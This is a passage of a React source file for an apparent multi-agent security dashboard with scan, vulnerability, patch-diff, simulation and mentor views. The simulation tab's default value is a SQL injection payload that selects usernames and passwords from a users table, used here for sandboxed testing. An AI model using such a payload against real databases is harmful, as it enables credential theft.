import React, { useState, useEffect } from 'react';
import { 
  Shield, 
  Terminal, 
  Settings, 
  AlertTriangle, 
  ChevronRight, 
  Play, 
  Layers, 
  Code, 
  MessageSquare, 
  GitPullRequest, 
  Search, 
  RefreshCw, 
  Flame, 
  Bot,
  Activity,
  User,
  ExternalLink,
  Info,
  CheckCircle,
  HelpCircle,
  Clock,
  Sparkles,
  Lock,
  Skull
} from 'lucide-react';

const API_BASE = ""; // Proxied to local port 8000 via Vite configuration

export default function App() {
  const [activeTab, setActiveTab] = useState('dashboard');
  const [repos, setRepos] = useState([]);
  const [scans, setScans] = useState([]);
  const [selectedScan, setSelectedScan] = useState(null);
  const [vulnerabilities, setVulnerabilities] = useState([]);
  const [agentLogs, setAgentLogs] = useState([]);
  const [selectedVuln, setSelectedVuln] = useState(null);
  const [gitUrlInput, setGitUrlInput] = useState('https://github.com/demo/vulnerable-app');
  const [mentorInput, setMentorInput] = useState('');
  const [mentorHistory, setMentorHistory] = useState([]);
  const [simType, setSimType] = useState('SQL Injection');
  const [simPayload, setSimPayload] = useState("' UNION SELECT id, username, password FROM users --");
  const [simLogs, setSimLogs] = useState([]);
  const [simResult, setSimResult] = useState(null);
  const [isSimulating, setIsSimulating] = useState(false);
  const [isRefreshing, setIsRefreshing] = useState(false);

  // Load Initial Data
  useEffect(() => {
    fetchRepos();
    fetchScans();
    fetchVulnerabilities();
    fetchChatHistory();
  }, []);

  // Poll scan logs periodically if a scan is currently active
  useEffect(() => {
    let interval = null;
    const activeScan = scans.find(s => s.status === 'Running' || s.status === 'Pending');
    
    if (activeScan) {
      interval = setInterval(() => {
        fetchScans();
        fetchVulnerabilities();
        if (selectedScan && selectedScan.id === activeScan.id) {
          fetchLogs(activeScan.id);
        } else if (!selectedScan) {
          // Default to loading active scan logs
          fetchLogs(activeScan.id);
        }
      }, 3000);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [scans, selectedScan]);

  const fetchRepos = async () => {
    try {
      const res = await fetch('/api/repositories');
      const data = await res.json();
      setRepos(data);
    } catch (e) { console.error("Error loading repositories:", e); }
  };

  const fetchScans = async () => {
    try {
      const res = await fetch('/api/scans');
      const data = await res.json();
      setScans(data);
    } catch (e) { console.error("Error loading scans:", e); }
  };

  const fetchVulnerabilities = async () => {
    try {
      const res = await fetch('/api/vulnerabilities');
      const data = await res.json();
      setVulnerabilities(data);
    } catch (e) { console.error("Error loading vulnerabilities:", e); }
  };

  const fetchLogs = async (scanId) => {
    try {
      const res = await fetch(`/api/scans/${scanId}/logs`);
      const data = await res.json();
      setAgentLogs(data);
    } catch (e) { console.error("Error loading agent logs:", e); }
  };

  const fetchChatHistory = async () => {
    try {
      const res = await fetch('/api/mentor/history');
      const data = await res.json();
      setMentorHistory(data);
    } catch (e) { console.error("Error loading mentor chat:", e); }
  };

  const triggerScan = async (repoId) => {
    try {
      const res = await fetch(`/api/scans/trigger/${repoId}`, { method: 'POST' });
      const data = await res.json();
      fetchScans();
      // Auto-select scan logs panel
      const triggeredScan = data;
      setSelectedScan(triggeredScan);
      fetchLogs(triggeredScan.id);
      setActiveTab('logs');
    } catch (e) { alert("Failed to trigger scan: " + e.message); }
  };

  const registerRepo = async () => {
    if (!gitUrlInput) return;
    try {
      const res = await fetch('/api/repositories', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ clone_url: gitUrlInput, owner: "", name: "", branch: "main" })
      });
      const data = await res.json();
      fetchRepos();
      triggerScan(data.id);
    } catch (e) { alert("Failed to register repository: " + e.message); }
  };

  const triggerMockWebhook = async () => {
    try {
      const randomSha = Math.random().toString(16).substring(2, 10);
      const res = await fetch('/api/webhooks/github', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ref: "refs/heads/main",
          after: randomSha,
          repository: {
            name: "e-commerce-backend",
            clone_url: "https://github.com/dummy/e-commerce-backend",
            owner: { name: "retail-corp" }
          }
        })
      });
      const data = await res.json();
      fetchScans();
      setActiveTab('logs');
      alert("Mock push webhook received! Running AI agents pipeline.");
    } catch (e) { alert("Failed to dispatch mock webhook: " + e.message); }
  };

  const sendMentorMessage = async () => {
    if (!mentorInput.trim()) return;
    const tempMsg = mentorInput;
    setMentorInput('');
    setMentorHistory(prev => [...prev, { id: Date.now(), sender: 'user', message: tempMsg, timestamp: new Date() }]);
    
    try {
      const res = await fetch('/api/mentor/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: tempMsg })
      });
      const data = await res.json();
      setMentorHistory(prev => [...prev, data]);
    } catch (e) { console.error("Error sending mentor chat:", e); }
  };

  const runSimulation = async () => {
    setIsSimulating(true);
    setSimLogs(['[*] Initiating virtual penetration testing console...', '[*] Accessing local security sandbox...']);
    setSimResult(null);
    try {
      const res = await fetch('/api/simulate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ vulnerability_type: simType, payload: simPayload })
      });
      const data = await res.json();
      
      // Animate logs printout
      for (let i = 0; i < data.execution_logs.length; i++) {
        await new Promise(r => setTimeout(r, 400));
        setSimLogs(prev => [...prev, data.execution_logs[i]]);
      }
      setSimResult(data);
    } catch (e) {
      setSimLogs(prev => [...prev, `[!] Simulation error: ${e.message}`]);
    } finally {
      setIsSimulating(false);
    }
  };

  const handleApplyPatch = async (vulnId) => {
    try {
      // Simulate confirmation and success
      const res = await fetch(`/api/vulnerabilities/${vulnId}/status`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: "Patched" })
      });
      const data = await res.json();
      fetchVulnerabilities();
      if (selectedVuln && selectedVuln.id === vulnId) {
        setSelectedVuln(data);
      }
      alert("Remediation patch applied successfully! Opened Branch. Pull Request updated.");
    } catch (e) { alert("Error applying patch: " + e.message); }
  };

  // Helper Stats Calculation
  const criticalCount = vulnerabilities.filter(v => v.priority === 'Critical').length;
  const highCount = vulnerabilities.filter(v => v.priority === 'High').length;
  const medCount = vulnerabilities.filter(v => v.priority === 'Medium').length;
  const lowCount = vulnerabilities.filter(v => v.priority === 'Low').length;
  const totalCount = vulnerabilities.length;
  const patchedCount = vulnerabilities.filter(v => v.status === 'Patched').length;

  return (
    <div className="flex h-screen bg-[#0B0F19] text-[#E2E8F0] grid-cyber">
      
      {/* Sidebar Navigation */}
      <aside className="w-64 bg-[#0d1322] border-r border-[#1e293b] flex flex-col justify-between shrink-0">
        <div>
          <div className="h-16 flex items-center px-6 gap-3 border-b border-[#1e293b] bg-slate-950/40">
            <div className="p-1.5 rounded-lg bg-blue-500/10 border border-blue-500/30 text-blue-400">
              <Shield className="w-6 h-6 animate-pulse" />
            </div>
            <div>
              <h1 className="font-extrabold text-md tracking-wider text-white">SECUREAGENT AI</h1>
              <span className="text-[10px] text-blue-400 font-mono tracking-widest uppercase">Autonomous SecOps</span>
            </div>
          </div>
          
          <nav className="p-4 space-y-1">
            <button 
              onClick={() => setActiveTab('dashboard')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-lg text-sm transition-all duration-200 ${activeTab === 'dashboard' ? 'bg-blue-500/10 border border-blue-500/30 text-white font-semibold shadow-neon' : 'text-slate-400 hover:bg-[#1a2336] hover:text-slate-200'}`}
            >
              <Layers className="w-4 h-4 text-blue-400" />
              Security Dashboard
            </button>
            
            <button 
              onClick={() => setActiveTab('scans')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-lg text-sm transition-all duration-200 ${activeTab === 'scans' ? 'bg-blue-500/10 border border-blue-500/30 text-white font-semibold shadow-neon' : 'text-slate-400 hover:bg-[#1a2336] hover:text-slate-200'}`}
            >
              <Activity className="w-4 h-4 text-emerald-400" />
              Repository Scans
            </button>

            <button 
              onClick={() => {
                setActiveTab('vulns');
                if (vulnerabilities.length > 0 && !selectedVuln) {
                  setSelectedVuln(vulnerabilities[0]);
                }
              }}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-lg text-sm transition-all duration-200 ${activeTab === 'vulns' ? 'bg-blue-500/10 border border-blue-500/30 text-white font-semibold shadow-neon' : 'text-slate-400 hover:bg-[#1a2336] hover:text-slate-200'}`}
            >
              <AlertTriangle className="w-4 h-4 text-red-400" />
              Vulnerabilities
              {vulnerabilities.filter(v => v.status === 'Open').length > 0 && (
                <span className="ml-auto px-2 py-0.5 text-xs font-bold bg-red-500/20 text-red-400 rounded-full border border-red-500/30">
                  {vulnerabilities.filter(v => v.status === 'Open').length}
                </span>
              )}
            </button>

            <button 
              onClick={() => {
                setActiveTab('logs');
                if (scans.length > 0 && !selectedScan) {
                  setSelectedScan(scans[0]);
                  fetchLogs(scans[0].id);
                }
              }}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-lg text-sm transition-all duration-200 ${activeTab === 'logs' ? 'bg-blue-500/10 border border-blue-500/30 text-white font-semibold shadow-neon' : 'text-slate-400 hover:bg-[#1a2336] hover:text-slate-200'}`}
            >
              <Terminal className="w-4 h-4 text-purple-400" />
              Agent Debates & Logs
            </button>

            <button 
              onClick={() => setActiveTab('simulation')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-lg text-sm transition-all duration-200 ${activeTab === 'simulation' ? 'bg-blue-500/10 border border-blue-500/30 text-white font-semibold shadow-neon' : 'text-slate-400 hover:bg-[#1a2336] hover:text-slate-200'}`}
            >
              <Skull className="w-4 h-4 text-orange-400" />
              Attack Simulation
            </button>

            <button 
              onClick={() => setActiveTab('mentor')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-lg text-sm transition-all duration-200 ${activeTab === 'mentor' ? 'bg-blue-500/10 border border-blue-500/30 text-white font-semibold shadow-neon' : 'text-slate-400 hover:bg-[#1a2336] hover:text-slate-200'}`}
            >
              <Bot className="w-4 h-4 text-cyan-400" />
              AI Security Mentor
            </button>
          </nav>
        </div>

        {/* Developer Info Footer */}
        <div className="p-4 border-t border-[#1e293b] bg-slate-950/20 text-xs">
          <div className="flex items-center gap-2 mb-2 text-slate-400">
            <Lock className="w-3.5 h-3.5 text-blue-400" />
            <span>SecOps Status: <span className="text-emerald-400 font-bold">ACTIVE</span></span>
          </div>
          <p className="text-[10px] text-slate-500 leading-normal font-mono">
            Autonomous multi-agent orchestration scanning git tree hooks.
          </p>
        </div>
      </aside>

      {/* Main Panel Area */}
      <main className="flex-1 flex flex-col min-w-0 overflow-y-auto">
        
        {/* Header bar */}
        <header className="h-16 border-b border-[#1e293b] bg-[#0d1322]/80 backdrop-blur-md px-8 flex items-center justify-between sticky top-0 z-10">
          <div className="flex items-center gap-4">
            <span className="text-xs uppercase font-mono tracking-widest text-slate-500">System Pipeline</span>
            <span className="h-4 w-px bg-slate-800"></span>
            <span className="text-sm font-semibold text-slate-300">
              {activeTab === 'dashboard' && 'Security Insights Overview'}
              {activeTab === 'scans' && 'Git Repositories Scan Engine'}
              {activeTab === 'vulns' && 'Vulnerabilities Details & AI Diff'}
              {activeTab === 'logs' && 'Agent Logs & Severe Rating Debate'}
              {activeTab === 'simulation' && 'Safe Sandbox Penetration Tool'}
              {activeTab === 'mentor' && 'Interactive AI Security Coach'}
            </span>
          </div>

          <div className="flex items-center gap-3">
            <button 
              onClick={triggerMockWebhook}
              className="px-3.5 py-1.5 rounded-lg border border-purple-500/40 text-purple-400 bg-purple-500/5 hover:bg-purple-500/10 text-xs font-semibold flex items-center gap-2 shadow-sm transition-all"
            >
              <GitPullRequest className="w-3.5 h-3.5" />
              Mock GitHub Webhook Push
            </button>
            
            <button 
              onClick={async () => {
                setIsRefreshing(true);
                await Promise.all([fetchRepos(), fetchScans(), fetchVulnerabilities()]);
                setIsRefreshing(false);
              }}
              className="p-2 rounded-lg border border-[#1e293b] hover:bg-[#1a2336] text-slate-400 transition"
              disabled={isRefreshing}
            >
              <RefreshCw className={`w-4 h-4 ${isRefreshing ? 'animate-spin' : ''}`} />
            </button>
          </div>
        </header>

        {/* Content Container */}
        <div className="p-8 max-w-[1600px] w-full mx-auto space-y-8 flex-1">

          {/* ==================== DASHBOARD TAB ==================== */}
          {activeTab === 'dashboard' && (
            <div className="space-y-8">
              
              {/* Top Banner Row */}
              <div className="glass-card rounded-2xl p-6 relative overflow-hidden flex flex-col md:flex-row items-center justify-between gap-6 border-l-4 border-l-blue-500">
                <div className="space-y-2 max-w-2xl">
                  <h2 className="text-2xl font-bold text-white flex items-center gap-2">
                    <Sparkles className="w-6 h-6 text-blue-400 animate-pulse" />
                    Multi-Agent Security Operations Center
                  </h2>
                  <p className="text-sm text-slate-400 leading-relaxed">
                    SecureAgent AI utilizes an Orchestrator coordinating multiple specialized AI agents (Scanner, Threat Intelligence, Risk Prioritizer, Fix recommender, Patch manager, Reporter) to autonomously secure code before deployment.
                  </p>
                </div>
                <div className="flex gap-4 shrink-0">
                  <div className="text-center bg-[#070b13] border border-[#1e293b] rounded-xl px-5 py-4 min-w-[120px]">
                    <div className="text-2xl font-bold text-white">{totalCount}</div>
                    <div className="text-[10px] uppercase font-mono tracking-wider text-slate-500 mt-1">Total Risks</div>
                  </div>
                  <div className="text-center bg-[#070b13] border border-[#1e293b] rounded-xl px-5 py-4 min-w-[120px]">
                    <div className="text-2xl font-bold text-emerald-400">{patchedCount}</div>
                    <div className="text-[10px] uppercase font-mono tracking-wider text-slate-500 mt-1">Patched PRs</div>
                  </div>
                </div>
              </div>

              {/* Stat Cards Grid */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
                
                <div className="glass-card rounded-2xl p-6 flex items-center justify-between border border-red-500/20 shadow-neonRed">
                  <div className="space-y-1">
                    <span className="text-xs uppercase font-mono text-red-400">Critical Priority</span>
                    <h3 className="text-3xl font-extrabold text-white">{criticalCount}</h3>
                  </div>
                  <div className="p-3 bg-red-500/10 text-red-400 border border-red-500/20 rounded-xl">
                    <Flame className="w-6 h-6 animate-bounce" />
                  </div>
                </div>

                <div className="glass-card rounded-2xl p-6 flex items-center justify-between border border-orange-500/20">
                  <div className="space-y-1">
                    <span className="text-xs uppercase font-mono text-orange-400">High Severity</span>
                    <h3 className="text-3xl font-extrabold text-white">{highCount}</h3>
                  </div>
                  <div className="p-3 bg-orange-500/10 text-orange-400 border border-orange-500/20 rounded-xl">
                    <AlertTriangle className="w-6 h-6" />
                  </div>
                </div>

                <div className="glass-card rounded-2xl p-6 flex items-center justify-between border border-yellow-500/20">
                  <div className="space-y-1">
                    <span className="text-xs uppercase font-mono text-yellow-400">Medium Risk</span>
                    <h3 className="text-3xl font-extrabold text-white">{medCount}</h3>
                  </div>
                  <div className="p-3 bg-yellow-500/10 text-yellow-400 border border-yellow-500/20 rounded-xl">
                    <Info className="w-6 h-6" />
                  </div>
                </div>

                <div className="glass-card rounded-2xl p-6 flex items-center justify-between border border-blue-500/20">
                  <div className="space-y-1">
                    <span className="text-xs uppercase font-mono text-blue-400">Low Severity</span>
                    <h3 className="text-3xl font-extrabold text-white">{lowCount}</h3>
                  </div>
                  <div className="p-3 bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-xl">
                    <CheckCircle className="w-6 h-6" />
                  </div>
                </div>

              </div>

              {/* Heatmaps & Recent Scans Row */}
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                
                {/* Security Heatmap */}
                <div className="glass-card rounded-2xl p-6 lg:col-span-1 space-y-6">
                  <div className="flex items-center justify-between border-b border-[#1e293b] pb-4">
                    <h3 className="text-md font-bold text-white flex items-center gap-2">
                      <Layers className="w-4 h-4 text-blue-400" />
                      Vulnerability Heatmap
                    </h3>
                    <span className="text-[10px] font-mono bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded border border-blue-500/20">OWASP Top 10</span>
                  </div>
                  
                  <div className="space-y-4">
                    {/* Mock heat list mapping types to density */}
                    {[
                      { type: 'SQL Injection (A03:2021)', count: criticalCount + highCount, color: 'bg-red-500' },
                      { type: 'Cross-Site Scripting (A03:2021)', count: medCount, color: 'bg-orange-500' },
                      { type: 'Secrets Leak (A02:2021)', count: highCount + criticalCount, color: 'bg-red-600' },
                      { type: 'SSRF (A10:2021)', count: medCount + highCount, color: 'bg-yellow-500' },
                    ].map((row, idx) => (
                      <div key={idx} className="space-y-1.5">
                        <div className="flex justify-between text-xs">
                          <span className="text-slate-300 font-mono">{row.type}</span>
                          <span className="text-slate-400 font-bold">{row.count} alerts</span>
                        </div>
                        <div className="h-2 w-full bg-[#161b2a] rounded-full overflow-hidden">
                          <div 
                            className={`h-full ${row.color}`} 
                            style={{ width: `${Math.min(100, (row.count / Math.max(1, totalCount)) * 100)}%` }}
                          ></div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Recent Scan History */}
                <div className="glass-card rounded-2xl p-6 lg:col-span-2 space-y-6">
                  <div className="flex items-center justify-between border-b border-[#1e293b] pb-4">
                    <h3 className="text-md font-bold text-white flex items-center gap-2">
                      <Clock className="w-4 h-4 text-emerald-400" />
                      Recent Automations Executed
                    </h3>
                    <button 
                      onClick={() => setActiveTab('scans')}
                      className="text-xs text-blue-400 hover:text-blue-300 font-semibold"
                    >
                      View all
                    </button>
                  </div>
                  
                  <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse text-sm">
                      <thead>
                        <tr className="border-b border-[#1e293b] text-slate-500 text-xs font-mono">
                          <th className="pb-3">Repository</th>
                          <th className="pb-3">Branch</th>
                          <th className="pb-3">Status</th>
                          <th className="pb-3">Date</th>
                          <th className="pb-3 text-right">Action</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-[#1e293b]/50">
                        {scans.slice(0, 5).map((s) => {
                          const repo = repos.find(r => r.id === s.repository_id) || { name: 'repo', owner: 'owner' };
                          return (
                            <tr key={s.id} className="group hover:bg-[#1a2336]/30">
                              <td className="py-3 font-semibold text-white">
                                {repo.owner}/{repo.name}
                              </td>
                              <td className="py-3 text-slate-400 font-mono">{s.branch}</td>
                              <td className="py-3">
                                <span className={`inline-flex items-center gap-1.5 px-2 py-0.5 text-xs font-semibold rounded-full border ${
                                  s.status === 'Success' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' :
                                  s.status === 'Running' ? 'bg-blue-500/10 text-blue-400 border-blue-500/20 animate-pulse' :
                                  s.status === 'Pending' ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' :
                                  'bg-red-500/10 text-red-400 border-red-500/20'
                                }`}>
                                  {s.status}
                                </span>
                              </td>
                              <td className="py-3 text-slate-500 text-xs">
                                {new Date(s.created_at).toLocaleString()}
                              </td>
                              <td className="py-3 text-right">
                                <button 
                                  onClick={() => {
                                    setSelectedScan(s);
                                    fetchLogs(s.id);
                                    setActiveTab('logs');
                                  }}
                                  className="text-xs text-blue-400 hover:underline inline-flex items-center gap-1"
                                >
                                  View Logs
                                  <ChevronRight className="w-3.5 h-3.5" />
                                </button>
                              </td>
                            </tr>
                          );
                        })}
                        {scans.length === 0 && (
                          <tr>
                            <td colSpan="5" className="text-center py-6 text-slate-500 font-mono">
                              No security scan history registered. Trigger a scan above!
                            </td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>
                </div>

              </div>

            </div>
          )}

          {/* ==================== SCANS TAB ==================== */}
          {activeTab === 'scans' && (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
              
              {/* Scan Trigger Configuration */}
              <div className="glass-card rounded-2xl p-6 h-fit space-y-6">
                <h3 className="text-md font-bold text-white border-b border-[#1e293b] pb-4 flex items-center gap-2">
                  <Settings className="w-4 h-4 text-blue-400" />
                  Trigger Security Audit
                </h3>
                
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-mono uppercase text-slate-400">Git Repository Link</label>
                    <input 
                      type="text" 
                      value={gitUrlInput} 
                      onChange={(e) => setGitUrlInput(e.target.value)}
                      placeholder="HTTPS or SSH git clone path"
                      className="w-full bg-[#0a0e17] border border-[#1e293b] rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500 font-mono"
                    />
                    <p className="text-[10px] text-slate-500 font-mono leading-normal">
                      Leave default link to scan our mock project tree containing built-in SQLi, XSS, and Leaks.
                    </p>
                  </div>
                  
                  <button 
                    onClick={registerRepo}
                    className="w-full btn-cyber-primary text-white text-sm font-bold py-3 px-4 rounded-xl flex items-center justify-center gap-2"
                  >
                    <Play className="w-4 h-4" />
                    Register & Autonomous Scan
                  </button>
                </div>
              </div>

              {/* Registered Repositories List */}
              <div className="glass-card rounded-2xl p-6 lg:col-span-2 space-y-6">
                <h3 className="text-md font-bold text-white border-b border-[#1e293b] pb-4 flex items-center gap-2">
                  <Layers className="w-4 h-4 text-emerald-400" />
                  Configured Repositories
                </h3>

                <div className="grid gap-4">
                  {repos.map(r => (
                    <div key={r.id} className="p-4 rounded-xl bg-[#161b2a]/50 border border-[#2a364f]/50 flex items-center justify-between gap-4">
                      <div className="space-y-1">
                        <h4 className="font-bold text-white text-sm">{r.owner}/{r.name}</h4>
                        <p className="text-xs text-slate-500 font-mono overflow-hidden text-ellipsis whitespace-nowrap max-w-md">{r.clone_url}</p>
                      </div>
                      <div className="flex items-center gap-3 shrink-0">
                        <span className={`px-2 py-0.5 rounded text-xs font-mono uppercase font-bold border ${
                          r.status === 'Scanning' ? 'bg-blue-500/10 text-blue-400 border-blue-500/20 animate-pulse' :
                          'bg-slate-800 text-slate-400 border-slate-700'
                        }`}>
                          {r.status}
                        </span>
                        
                        <button 
                          onClick={() => triggerScan(r.id)}
                          className="px-3 py-1.5 text-xs font-semibold bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-lg transition"
                          disabled={r.status === 'Scanning'}
                        >
                          Manual Scan
                        </button>
                      </div>
                    </div>
                  ))}
                  {repos.length === 0 && (
                    <p className="text-center text-slate-500 py-10 font-mono">
                      No repositories connected. Add a repo link to test!
                    </p>
                  )}
                </div>
              </div>

            </div>
          )}

          {/* ==================== VULNERABILITIES TAB ==================== */}
          {activeTab === 'vulns' && (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
              
              {/* Left Column: Vulnerability Alerts List */}
              <div className="glass-card rounded-2xl p-6 lg:col-span-1 space-y-6 max-h-[800px] overflow-y-auto">
                <h3 className="text-md font-bold text-white border-b border-[#1e293b] pb-4 flex items-center gap-2">
                  <AlertTriangle className="w-4 h-4 text-red-500" />
                  Identified Threats ({vulnerabilities.length})
                </h3>

                <div className="space-y-3">
                  {vulnerabilities.map(v => (
                    <button
                      key={v.id}
                      onClick={() => setSelectedVuln(v)}
                      className={`w-full text-left p-3.5 rounded-xl border transition-all flex flex-col gap-2 ${
                        selectedVuln && selectedVuln.id === v.id 
                          ? 'bg-blue-500/10 border-blue-500/40 text-white shadow-sm' 
                          : 'bg-[#101524]/60 border-[#1e293b] hover:border-slate-700 text-slate-300'
                      }`}
                    >
                      <div className="flex justify-between items-center w-full">
                        <span className="font-bold text-sm tracking-tight truncate max-w-[180px]">{v.type}</span>
                        <span className={`px-2 py-0.5 text-[9px] font-bold uppercase rounded border ${
                          v.priority === 'Critical' ? 'bg-red-500/10 text-red-400 border-red-500/20' :
                          v.priority === 'High' ? 'bg-orange-500/10 text-orange-400 border-orange-500/20' :
                          v.priority === 'Medium' ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' :
                          'bg-blue-500/10 text-blue-400 border-blue-500/20'
                        }`}>
                          {v.priority || v.severity}
                        </span>
                      </div>
                      
                      <div className="flex justify-between text-xs text-slate-500 font-mono">
                        <span className="truncate max-w-[160px]">{v.file}</span>
                        <span>Line {v.line}</span>
                      </div>

                      <div className="flex justify-between items-center mt-1 w-full border-t border-[#1e293b]/40 pt-2 text-[10px] font-mono">
                        <span className="text-slate-400">{v.cve || 'CVE-Pending'}</span>
                        <span className={`font-semibold ${v.status === 'Patched' ? 'text-emerald-400' : 'text-yellow-500'}`}>{v.status}</span>
                      </div>
                    </button>
                  ))}
                  {vulnerabilities.length === 0 && (
                    <p className="text-center text-slate-500 py-10 font-mono">
                      No security alerts found. Trigger a scan first!
                    </p>
                  )}
                </div>
              </div>

              {/* Right Column: Alert Explainer & AI Code Patch */}
              <div className="glass-card rounded-2xl p-6 lg:col-span-2 space-y-6">
                {selectedVuln ? (
                  <div className="space-y-6">
                    
                    {/* Header Panel */}
                    <div className="flex items-start justify-between gap-4 border-b border-[#1e293b] pb-6">
                      <div className="space-y-1">
                        <div className="flex items-center gap-2.5">
                          <h2 className="text-xl font-bold text-white">{selectedVuln.type}</h2>
                          <span className="text-xs font-mono bg-slate-800 text-slate-400 px-2 py-0.5 rounded border border-slate-700">{selectedVuln.cve}</span>
                        </div>
                        <p className="text-sm font-mono text-slate-400">{selectedVuln.file} : Line {selectedVuln.line}</p>
                      </div>
                      
                      <div className="text-right shrink-0">
                        <div className="text-xs text-slate-500 font-mono">CVSS Score</div>
                        <div className={`text-2xl font-extrabold ${selectedVuln.cvss >= 9.0 ? 'text-red-400' : selectedVuln.cvss >= 7.0 ? 'text-orange-400' : 'text-yellow-400'}`}>
                          {selectedVuln.cvss ? selectedVuln.cvss.toFixed(1) : 'N/A'}
                        </div>
                      </div>
                    </div>

                    {/* Threat Intel Row */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6 bg-[#090d16] border border-[#1e293b] rounded-xl p-4">
                      <div className="space-y-1">
                        <span className="text-[10px] uppercase font-mono tracking-wider text-slate-500">Business Security Impact</span>
                        <p className="text-xs text-slate-300 leading-normal">{selectedVuln.business_impact || 'Evaluating application risk footprint...'}</p>
                      </div>
                      <div className="space-y-1 border-t md:border-t-0 md:border-l border-[#1e293b] pt-4 md:pt-0 md:pl-4">
                        <span className="text-[10px] uppercase font-mono tracking-wider text-slate-500">Public Exploit Status</span>
                        <p className={`text-xs font-bold ${selectedVuln.exploit_available ? 'text-red-400 animate-pulse' : 'text-slate-400'}`}>
                          {selectedVuln.exploit_available ? 'POC Exploit Available on GitHub/CISA' : 'No Public Exploit Identified'}
                        </p>
                      </div>
                    </div>

                    {/* Bug Description */}
                    <div className="space-y-2">
                      <h4 className="text-sm font-bold text-white flex items-center gap-1.5">
                        <Info className="w-4 h-4 text-blue-400" />
                        Vulnerability Explanation
                      </h4>
                      <p className="text-xs text-slate-300 leading-relaxed bg-[#161b2a]/30 p-3 rounded-lg border border-[#2a364f]/30">
                        {selectedVuln.description}
                      </p>
                    </div>

                    {/* PR Link (if Patched) */}
                    {selectedVuln.pr_url && (
                      <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 rounded-xl flex items-center justify-between text-xs">
                        <div className="flex items-center gap-2">
                          <GitPullRequest className="w-4 h-4" />
                          <span>AI Security Agent opened Pull Request <strong>#{selectedVuln.pr_number}</strong> on GitHub repository.</span>
                        </div>
                        <a href={selectedVuln.pr_url} target="_blank" rel="noreferrer" className="text-emerald-300 font-bold hover:underline flex items-center gap-1">
                          View PR
                          <ExternalLink className="w-3 h-3" />
                        </a>
                      </div>
                    )}

                    {/* Code Diff Panel */}
                    <div className="space-y-3">
                      <h4 className="text-sm font-bold text-white flex items-center gap-1.5">
                        <Code className="w-4 h-4 text-purple-400" />
                        AI Remediation Code Patch Comparison
                      </h4>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        {/* Before (Vulnerable) */}
                        <div className="space-y-1.5">
                          <div className="text-[10px] font-mono text-red-400 bg-red-950/20 border border-red-500/10 px-2.5 py-1 rounded">VULNERABLE CODE</div>
                          <pre className="p-3.5 rounded-lg bg-red-950/10 border border-red-500/20 text-xs font-mono overflow-x-auto text-red-300 max-h-48">
                            <code>{selectedVuln.before_code}</code>
                          </pre>
                        </div>

                        {/* After (Secure Remediation) */}
                        <div className="space-y-1.5">
                          <div className="text-[10px] font-mono text-emerald-400 bg-emerald-950/20 border border-emerald-500/10 px-2.5 py-1 rounded">SECURE REMEDIATION</div>
                          <pre className="p-3.5 rounded-lg bg-emerald-950/10 border border-emerald-500/20 text-xs font-mono overflow-x-auto text-emerald-300 max-h-48">
                            <code>{selectedVuln.after_code || '# Patch is currently being formulated by Fix agent...'}</code>
                          </pre>
                        </div>
                      </div>
                    </div>

                    {/* Action Row */}
                    {selectedVuln.status === 'Open' && selectedVuln.after_code && (
                      <div className="flex justify-end pt-4 border-t border-[#1e293b]/40">
                        <button
                          onClick={() => handleApplyPatch(selectedVuln.id)}
                          className="btn-cyber-success text-white font-bold py-2.5 px-6 rounded-xl text-xs flex items-center gap-2"
                        >
                          <GitPullRequest className="w-4 h-4" />
                          Apply AI Patch & Create Pull Request
                        </button>
                      </div>
                    )}

                  </div>
                ) : (
                  <div className="h-96 flex flex-col items-center justify-center text-slate-500 gap-2 font-mono">
                    <Shield className="w-8 h-8 text-blue-500/40 animate-pulse" />
                    <span>Select a vulnerability finding from the list to analyze.</span>
                  </div>
                )}
              </div>

            </div>
          )}

          {/* ==================== AGENT DEBATES & LOGS ==================== */}
          {activeTab === 'logs' && (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
              
              {/* Scan Runs Selector */}
              <div className="glass-card rounded-2xl p-6 lg:col-span-1 space-y-6 max-h-[800px] overflow-y-auto">
                <h3 className="text-md font-bold text-white border-b border-[#1e293b] pb-4 flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-purple-400" />
                  Select Execution Pipeline
                </h3>

                <div className="space-y-3">
                  {scans.map(s => {
                    const repo = repos.find(r => r.id === s.repository_id) || { name: 'repo', owner: 'owner' };
                    return (
                      <button
                        key={s.id}
                        onClick={() => {
                          setSelectedScan(s);
                          fetchLogs(s.id);
                        }}
                        className={`w-full text-left p-4 rounded-xl border transition-all flex flex-col gap-2 ${
                          selectedScan && selectedScan.id === s.id 
